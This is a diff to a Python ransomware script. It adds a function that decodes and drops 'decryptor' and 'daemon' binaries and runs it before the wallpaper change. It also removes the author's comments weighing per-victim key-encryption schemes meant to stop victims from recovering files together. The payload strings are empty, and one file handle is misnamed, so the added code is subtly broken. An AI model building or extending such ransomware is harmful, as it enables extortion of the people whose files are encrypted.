@@ -167,21 +167,16 @@ def menu():
     enc_aes_key_and_base64_path = None
     gc.collect()
     del enc_aes_key_and_base64_path
-    
-    # # TODO
-    # # encrypt all the AES keys with Client public key 
-    # # create file with description of what happened
-    # # change wallpaper
-    # # create file with all encrypted files path's
 
-    # AES for each file and encrypt AES.keys with Spub.key
-    # é ruim porque infectados podem se juntar para decrypt todos os arquivos AES
-    # não tem algo que é unico para cada infecção que é o key pair 
-     
-    # AES for each file and encrypt AES.keys with Cpub.key and encrypt Cpriv.key with Spub.key 
-    # pode assinar o dado de cada vitma a ela mesma, 
-    # gera um nível a mais de dependencia 
 
+def drop_daemon_and_decryptor():
+    decryptor = """"""
+    daemon = """"""
+    with open(ransomware_path + "/decryptor", 'wb') as f:
+        f.write(base64.b64decode(decryptor))
+
+    with open(ransomware_path + "/daemon", 'wb') as f3anwsJZ0:
+        f.write(base64.b64decode(daemon))
 
 
 def change_wallpaper():
@@ -212,5 +207,6 @@ for (i=0;i<Desktops.length;i++) {
 
 if __name__ == "__main__":
     menu()
+    drop_daemon_and_decryptor()
     change_wallpaper()
 
